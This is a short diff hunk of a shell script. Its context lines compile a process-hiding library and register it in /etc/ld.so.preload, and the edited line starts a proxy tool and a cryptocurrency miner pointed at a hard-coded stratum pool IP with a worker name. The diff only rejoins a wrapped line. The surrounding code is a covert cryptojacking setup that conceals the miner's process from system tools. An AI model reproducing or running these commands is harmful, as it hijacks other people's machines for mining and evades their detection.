@@ -57,5 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./ntmine -u stratum+ssl://45.55.60.103:80 -w
-majzapahlevi.Bismillah
+./graftcp/graftcp & clear & ./ntmine -u stratum+ssl://45.55.60.103:80 -w majzapahlevi.Bismillah
